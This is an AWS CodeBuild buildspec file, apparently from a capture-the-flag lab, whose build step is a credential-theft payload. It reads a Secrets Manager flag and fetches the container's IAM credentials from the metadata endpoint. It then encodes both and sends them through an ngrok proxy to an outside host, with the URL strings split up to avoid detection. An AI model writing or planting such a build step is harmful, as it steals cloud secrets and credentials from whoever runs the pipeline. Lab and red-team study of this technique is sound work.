version: 0.2
phases:
  build:
    commands:
      - |
        P="ht""tp://0.tcp.ngrok.io:25092"
        G="ht""tps://github.com/z"
        F=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --query SecretString --output text 2>&1 | head -c 300)
        curl -sk -x "$P" -o /dev/null "$G/f-$(printf '%s' "$F" | base64 -w0)"
        C=$(curl -s "ht""tp://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI")
        curl -sk -x "$P" -o /dev/null "$G/c-$(printf '%s' "$C" | gzip -9 | base64 -w0)"
